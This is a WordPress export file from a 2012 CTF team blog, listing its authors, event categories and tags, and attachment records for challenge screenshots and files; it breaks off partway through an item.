<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

<!-- generator="WordPress/3.4.2" created="2012-11-20 06:40" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>NANDy Narwhals</title>
	<link>http://nandynarwhals.org</link>
	<description>CTF Team</description>
	<pubDate>Tue, 20 Nov 2012 06:40:48 +0000</pubDate>
	<language>en-US</language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>http://nandynarwhals.org</wp:base_site_url>
	<wp:base_blog_url>http://nandynarwhals.org</wp:base_blog_url>

	<wp:author><wp:author_id>1</wp:author_id><wp:author_login>admin</wp:author_login><wp:author_email>kyou.wk@gmail.com</wp:author_email><wp:author_display_name><![CDATA[Hiromi]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>
	<wp:author><wp:author_id>2</wp:author_id><wp:author_login>amon</wp:author_login><wp:author_email>jergorn93@gmail.com</wp:author_email><wp:author_display_name><![CDATA[amon]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>
	<wp:author><wp:author_id>3</wp:author_id><wp:author_login>dynadolos</wp:author_login><wp:author_email>niktay94@gmail.com</wp:author_email><wp:author_display_name><![CDATA[dynadolos]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>

	<wp:category><wp:term_id>3</wp:term_id><wp:category_nicename>codegate</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Codegate]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>11</wp:term_id><wp:category_nicename>cscamp</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[CSCamp]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>4</wp:term_id><wp:category_nicename>ctf</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[CTF]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>9</wp:term_id><wp:category_nicename>hack-lu</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Hack.lu]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>8</wp:term_id><wp:category_nicename>hackyou</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[HackYou]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>7</wp:term_id><wp:category_nicename>hitb</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[HITB]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>12</wp:term_id><wp:category_nicename>polictf</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[polictf]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>1</wp:term_id><wp:category_nicename>uncategorized</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Uncategorized]]></wp:cat_name></wp:category>
	<wp:tag><wp:term_id>5</wp:term_id><wp:tag_slug>codegate-2012</wp:tag_slug><wp:tag_name><![CDATA[codegate 2012]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>10</wp:term_id><wp:tag_slug>hack-lu-2012</wp:tag_slug><wp:tag_name><![CDATA[hack.lu 2012]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>6</wp:term_id><wp:tag_slug>writeup</wp:tag_slug><wp:tag_name><![CDATA[writeup]]></wp:tag_name></wp:tag>

	<generator>http://wordpress.org/?v=3.4.2</generator>

	<item>
		<title>ppc100-1</title>
		<link>http://nandynarwhals.org/2012/10/18/hack-you-ctf-2012-ppc100/ppc100-1/</link>
		<pubDate>Thu, 18 Oct 2012 15:32:51 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/ppc100-1.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>36</wp:post_id>
		<wp:post_date>2012-10-18 23:32:51</wp:post_date>
		<wp:post_date_gmt>2012-10-18 15:32:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>ppc100-1</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>33</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/ppc100-1.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/ppc100-1.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"552";s:6:"height";s:3:"150";s:14:"hwstring_small";s:23:"height='34' width='128'";s:4:"file";s:20:"2012/10/ppc100-1.png";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:4:"file";s:20:"ppc100-1-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:19:"ppc100-1-300x81.png";s:5:"width";s:3:"300";s:6:"height";s:2:"81";}s:13:"small-feature";a:3:{s:4:"file";s:20:"ppc100-1-500x135.png";s:5:"width";s:3:"500";s:6:"height";s:3:"135";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>stg200</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-halloween-stg200/stg200/</link>
		<pubDate>Thu, 18 Oct 2012 16:55:04 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/stg200.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>53</wp:post_id>
		<wp:post_date>2012-10-19 00:55:04</wp:post_date>
		<wp:post_date_gmt>2012-10-18 16:55:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>stg200</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>52</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/stg200.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/stg200.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1680";s:6:"height";s:4:"1050";s:14:"hwstring_small";s:23:"height='80' width='128'";s:4:"file";s:18:"2012/10/stg200.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:18:"stg200-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:18:"stg200-300x187.png";s:5:"width";s:3:"300";s:6:"height";s:3:"187";}s:5:"large";a:3:{s:4:"file";s:19:"stg200-1024x640.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"640";}s:14:"post-thumbnail";a:3:{s:4:"file";s:19:"stg200-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:19:"stg200-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:18:"stg200-480x300.png";s:5:"width";s:3:"480";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>nstg200</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-halloween-stg200/nstg200/</link>
		<pubDate>Thu, 18 Oct 2012 16:59:36 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/nstg200.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>54</wp:post_id>
		<wp:post_date>2012-10-19 00:59:36</wp:post_date>
		<wp:post_date_gmt>2012-10-18 16:59:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>nstg200</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>52</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/nstg200.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/nstg200.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1680";s:6:"height";s:4:"1050";s:14:"hwstring_small";s:23:"height='80' width='128'";s:4:"file";s:19:"2012/10/nstg200.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:19:"nstg200-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:19:"nstg200-300x187.png";s:5:"width";s:3:"300";s:6:"height";s:3:"187";}s:5:"large";a:3:{s:4:"file";s:20:"nstg200-1024x640.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"640";}s:14:"post-thumbnail";a:3:{s:4:"file";s:20:"nstg200-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:20:"nstg200-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:19:"nstg200-480x300.png";s:5:"width";s:3:"480";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>compare2</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-halloween-stg200/compare2/</link>
		<pubDate>Thu, 18 Oct 2012 17:03:08 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/compare2.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>55</wp:post_id>
		<wp:post_date>2012-10-19 01:03:08</wp:post_date>
		<wp:post_date_gmt>2012-10-18 17:03:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>compare2</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>52</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/compare2.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/compare2.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1680";s:6:"height";s:4:"1050";s:14:"hwstring_small";s:23:"height='80' width='128'";s:4:"file";s:20:"2012/10/compare2.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:20:"compare2-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:20:"compare2-300x187.png";s:5:"width";s:3:"300";s:6:"height";s:3:"187";}s:5:"large";a:3:{s:4:"file";s:21:"compare2-1024x640.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"640";}s:14:"post-thumbnail";a:3:{s:4:"file";s:21:"compare2-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:21:"compare2-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:20:"compare2-480x300.png";s:5:"width";s:3:"480";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>cry100</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-schneiers-algorithm-cry200/cry100/</link>
		<pubDate>Fri, 19 Oct 2012 01:25:26 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/cry100.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>62</wp:post_id>
		<wp:post_date>2012-10-19 09:25:26</wp:post_date>
		<wp:post_date_gmt>2012-10-19 01:25:26</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cry100</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>61</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/cry100.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/cry100.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"659";s:6:"height";s:3:"750";s:14:"hwstring_small";s:22:"height='96' width='84'";s:4:"file";s:18:"2012/10/cry100.jpg";s:5:"sizes";a:5:{s:9:"thumbnail";a:3:{s:4:"file";s:18:"cry100-150x150.jpg";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:18:"cry100-263x300.jpg";s:5:"width";s:3:"263";s:6:"height";s:3:"300";}s:14:"post-thumbnail";a:3:{s:4:"file";s:18:"cry100-659x288.jpg";s:5:"width";s:3:"659";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:18:"cry100-659x288.jpg";s:5:"width";s:3:"659";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:18:"cry100-263x300.jpg";s:5:"width";s:3:"263";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-19 09:29:49</title>
		<link>http://nandynarwhals.org/2012/10/19/66/screenshot-at-2012-10-19-092949/</link>
		<pubDate>Fri, 19 Oct 2012 02:12:23 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-092949.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>67</wp:post_id>
		<wp:post_date>2012-10-19 10:12:23</wp:post_date>
		<wp:post_date_gmt>2012-10-19 02:12:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-19-092949</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>66</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-092949.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-19-092949.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-19-092949.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-092949-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-092949-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-092949-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-092949-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-092949-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-092949-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-19 09:30:18</title>
		<link>http://nandynarwhals.org/2012/10/19/66/screenshot-at-2012-10-19-093018/</link>
		<pubDate>Fri, 19 Oct 2012 02:12:30 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093018.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>68</wp:post_id>
		<wp:post_date>2012-10-19 10:12:30</wp:post_date>
		<wp:post_date_gmt>2012-10-19 02:12:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-19-093018</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>66</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093018.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-19-093018.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-19-093018.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-093018-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-093018-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-093018-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-093018-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-093018-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-093018-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-19 09:30:29</title>
		<link>http://nandynarwhals.org/2012/10/19/66/screenshot-at-2012-10-19-093029/</link>
		<pubDate>Fri, 19 Oct 2012 02:12:37 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093029.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>69</wp:post_id>
		<wp:post_date>2012-10-19 10:12:37</wp:post_date>
		<wp:post_date_gmt>2012-10-19 02:12:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-19-093029</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>66</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093029.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-19-093029.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-19-093029.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-093029-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-093029-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-093029-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-093029-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-19-093029-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-19-093029-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Pentagon Data Storage Authentication</title>
		<link>http://nandynarwhals.org/2012/10/19/66/pentagon-data-storage-authentication/</link>
		<pubDate>Fri, 19 Oct 2012 02:14:14 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Pentagon-Data-Storage-Authentication.html</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>70</wp:post_id>
		<wp:post_date>2012-10-19 10:14:14</wp:post_date>
		<wp:post_date_gmt>2012-10-19 02:14:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>pentagon-data-storage-authentication</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>66</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Pentagon-Data-Storage-Authentication.html</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Pentagon-Data-Storage-Authentication.html]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>rev200</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-reverse-200-rev200/rev200/</link>
		<pubDate>Fri, 19 Oct 2012 10:56:11 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/rev200.zip</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>92</wp:post_id>
		<wp:post_date>2012-10-19 18:56:11</wp:post_date>
		<wp:post_date_gmt>2012-10-19 10:56:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>rev200</wp:post_name>
